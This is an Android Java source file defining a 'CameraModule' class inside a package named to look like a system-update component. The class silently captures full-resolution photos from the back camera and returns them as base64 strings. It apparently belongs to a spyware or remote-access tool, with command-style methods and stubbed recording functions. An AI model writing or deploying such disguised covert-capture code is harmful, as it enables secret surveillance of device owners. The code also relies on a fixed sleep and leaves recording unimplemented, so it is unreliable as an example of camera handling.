package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Size;
import androidx.core.app.ActivityCompat;
import android.graphics.ImageFormat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class CameraModule {
    private Context context;
    private CameraManager cameraManager;
    private String cameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private ImageReader imageReader;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private MediaRecorder mediaRecorder;
    private String videoFilePath;
    private boolean isRecording = false;
    
    public CameraModule(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        startBackgroundThread();
        
        // Get back camera by default
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public String takePhoto() {
        if (!checkPermission()) return "ERROR: No camera permission";
        
        try {
            final File photoFile = File.createTempFile("photo", ".jpg", 
                context.getExternalFilesDir(null));
            
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    try {
                        Size largest = getLargestSize();
                        imageReader = ImageReader.newInstance(largest.getWidth(), 
                            largest.getHeight(), ImageFormat.JPEG, 1);
                        
                        imageReader.setOnImageAvailableListener(reader -> {
                            try (Image image = reader.acquireLatestImage()) {
                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buffer.remaining()];
                                buffer.get(bytes);
                                
                                FileOutputStream fos = new FileOutputStream(photoFile);
                                fos.write(bytes);
                                fos.close();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }, backgroundHandler);
                        
                        device.createCaptureSession(
                            java.util.Collections.singletonList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        CaptureRequest.Builder builder = 
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        builder.addTarget(imageReader.getSurface());
                                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                        
                                        captureSession.capture(builder.build(), null, backgroundHandler);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {}
                            }, backgroundHandler
                        );
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {}
                
                @Override
                public void onError(CameraDevice device, int error) {}
            }, backgroundHandler);
            
            // Wait a bit for photo to be taken
            Thread.sleep(2000);
            
            if (photoFile.exists()) {
                byte[] bytes = java.nio.file.Files.readAllBytes(photoFile.toPath());
                return "data:image/jpeg;base64," + Base64.encodeToString(bytes, Base64.DEFAULT);
            }
            
            return "ERROR: Failed to capture photo";
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    public void startRecording(String args) {
        if (!checkPermission()) return;
        isRecording = true;
    }
    
    public String stopRecording() {
        isRecording = false;
        return "Recording stopped";
    }
    
    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            
            Size largest = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() > largest.getWidth()) {
                    largest = size;
                }
            }
            return largest;
        } catch (Exception e) {
            return new Size(1920, 1080);
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
}